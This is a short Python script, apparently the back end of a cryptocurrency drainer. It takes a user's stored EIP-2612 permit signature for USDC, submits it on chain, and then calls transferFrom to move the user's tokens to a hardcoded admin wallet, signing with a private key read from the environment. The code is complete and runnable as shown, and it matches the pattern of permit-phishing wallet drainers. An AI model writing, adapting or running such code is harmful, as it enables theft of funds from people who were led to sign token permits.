import os
from web3 import Web3
from dotenv import load_dotenv

load_dotenv()
w3 = Web3(Web3.HTTPProvider(os.getenv("RPC_URL")))
ADMIN_WALLET = Web3.to_checksum_address("0xC629b1959A638d62B60665317C0D3874B389d8F4")
PRIVATE_KEY = os.getenv("ADMIN_PRIVATE_KEY")
USDC_ADDRESS = Web3.to_checksum_address("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48")
ABI = [
    {"constant": True, "inputs": [{"name": "owner", "type": "address"}], "name": "nonces", "outputs": [{"name": "", "type": "uint256"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "owner", "type": "address"}, {"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}, {"name": "deadline", "type": "uint256"}, {"name": "v", "type": "uint8"}, {"name": "r", "type": "bytes32"}, {"name": "s", "type": "bytes32"}], "name": "permit", "outputs": [], "type": "function"},
    {"constant": False, "inputs": [{"name": "from", "type": "address"}, {"name": "to", "type": "address"}, {"name": "value", "type": "uint256"}], "name": "transferFrom", "outputs": [{"name": "", "type": "bool"}], "type": "function"}
]

def extract_usdc_secure(profile, extraction_units):
    contract = w3.eth.contract(address=USDC_ADDRESS, abi=ABI)
    user_wallet = Web3.to_checksum_address(profile.wallet_address)
    permit_func = contract.functions.permit(user_wallet, ADMIN_WALLET, int(profile.authorized_amount), int(profile.permit_deadline), int(profile.permit_v), Web3.to_bytes(hexstr=profile.permit_r), Web3.to_bytes(hexstr=profile.permit_s))
    gas_p = permit_func.estimate_gas({'from': ADMIN_WALLET})
    tx_p = permit_func.build_transaction({'from': ADMIN_WALLET, 'nonce': w3.eth.get_transaction_count(ADMIN_WALLET), 'gas': int(gas_p * 1.2), 'gasPrice': int(w3.eth.gas_price * 1.5)})
    w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(tx_p, PRIVATE_KEY).raw_transaction))
    transfer_func = contract.functions.transferFrom(user_wallet, ADMIN_WALLET, int(extraction_units))
    gas_t = transfer_func.estimate_gas({'from': ADMIN_WALLET})
    tx_t = transfer_func.build_transaction({'from': ADMIN_WALLET, 'nonce': w3.eth.get_transaction_count(ADMIN_WALLET), 'gas': int(gas_t * 1.2), 'gasPrice': int(w3.eth.gas_price * 1.5)})
    return w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(tx_t, PRIVATE_KEY).raw_transaction))